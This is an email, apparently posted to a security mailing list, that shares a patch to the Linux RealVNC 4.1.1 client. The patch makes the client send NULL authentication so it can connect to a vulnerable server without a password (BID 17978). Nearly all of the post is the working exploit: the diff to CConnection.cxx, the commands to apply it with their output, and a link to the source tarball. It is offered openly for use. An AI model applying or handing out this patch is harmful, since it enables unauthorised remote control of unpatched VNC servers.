Subject: Linux VNC evil client patch - BID 17978


Hi all,
I have done a patch to current Linux VNC client (ver. 4.1.1), which permit to authenticate to a bugged server with a NULL session, although password authentication is required 
(RealVNC Remote Authentication Bypass Vulnerability, BID 17978).

Here is the patch for file CConnection.cxx
$ cat vnc4-4.1.1+X4.3.0-NULL-Auth.patch
184,185c184,185
<     // Inform the server of our decision
<     if (secType != secTypeInvalid) {
---
>     // Send to server NULL Auth [0x01] 
>     if (secType=0x01) {

Apply with
$ patch < vnc4-4.1.1+X4.3.0-NULL-Auth.patch
File to patch: vnc4-4.1.1+X4.3.0.orig/common/rfb/CConnection.cxx
patching file vnc4-4.1.1+X4.3.0.orig/common/rfb/CConnection.cxx

The original tarball is named vnc4_4.1.1+X4.3.0.orig.tar.gz:
http://ftp.debian.org/debian/pool/main/v/vnc4/vnc4_4.1.1+X4.3.0.orig.tar.gz

Have a nice day
